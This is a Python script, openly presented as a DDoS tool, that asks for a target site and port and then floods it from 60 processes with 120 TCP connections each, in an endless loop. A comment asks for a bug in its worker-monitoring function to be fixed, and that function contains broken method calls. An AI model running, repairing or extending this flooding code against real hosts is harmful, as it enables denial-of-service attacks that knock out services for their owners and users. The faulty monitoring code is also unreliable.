from helpers import get_random_url
import json
import socket
import multiprocessing


def ddos_attack(ip_address, port, number_of_sockets):
    try:
        sockets = []
        for i in range(number_of_sockets):
            ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ddos.connect((ip_address, port))
            sockets.append(ddos)

        for ddos in sockets:
            random_url = get_random_url()
            message = json.dumps(random_url).encode()
            ddos.send(message)
            ddos.sendto(message, (ip_address, port))
            ddos.send(message)

        for conn_close in sockets:
            try:
                conn_close.close()
            except:
                pass
    except Exception as err:
        print(err)


def monitor(workers):
    while len(workers) > 10:
        try:
            # Debug the below code the fix the bug
            for worker in workers:
                if worker is not None and worker.isALive():
                    worker.JOIN(1.0)
                    print(f"Woker Number - {worker.name} Joined!")
                else:
                    workers.pop(worker)
        # Except block should only run when keyboard  interruption and system exit will happen
        except Exception as err:
            print("CTRL+C received. Killing all workers")
            for worker in workers:
                try:
                    print(f"Killing worker {worker.name}")
                    worker.stop()
                except Exception:
                    pass


def main():
    host = input("Site you want to DDoS:")
    port = int(input("Enter port number:"))

    ip_address = socket.gethostbyname(host)

    number_of_sockets = 120

    number_of_workers = 60
    print("|| DDoS Loaded ||")

    print("Hitting webserver in mode '{0}' with {1} workers running {2} connections each. Hit CTRL+C to cancel.".format(
        "GET", number_of_workers, number_of_sockets))

    while True:
        try:
            workers = []
            for i in range(number_of_workers):
                worker = multiprocessing.Process(
                    target=ddos_attack, args=(ip_address, port, number_of_sockets))
                workers.append(worker)

                worker.start()

            monitor(workers)

        except Exception as err:
            print("| Connection Failed |")


if __name__ == "__main__":
    main()
